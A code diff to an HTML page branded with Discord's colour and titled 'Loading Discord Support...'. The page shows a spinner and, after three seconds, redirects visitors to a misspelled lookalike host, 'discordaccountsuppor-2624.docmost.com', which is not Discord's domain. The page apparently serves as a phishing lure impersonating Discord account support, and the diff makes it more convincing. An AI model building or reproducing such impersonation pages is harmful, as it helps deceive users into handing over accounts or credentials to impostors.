@@ -5,14 +5,40 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="theme-color" content="#5865F2" />
   <link rel="manifest" href="manifest.json" />
-  <title>Redirecting...</title>
-  <script>
-    window.onload = () => {
-      window.location.replace("https://discordaccountsuppor-2624.docmost.com/home");
-    };
-  </script>
+  <link rel="icon" href="icons/icon-192.png" />
+  <title>Loading Discord Support...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f6f6f6;
+      color: #444;
+      text-align: center;
+      margin-top: 100px;
+    }
+    .loader {
+      border: 5px solid #eee;
+      border-top: 5px solid #5865F2;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <p>Redirecting to Discord Account Support...</p>
+  <h1>Launching Discord Account Support...</h1>
+  <div class="loader"></div>
+  <p>Please wait while we redirect you.</p>
+
+  <script>
+    setTimeout(() => {
+      window.location.replace("https://discordaccountsuppor-2624.docmost.com/home");
+    }, 3000); // wait 3 seconds before redirect
+  </script>
 </body>
 </html>
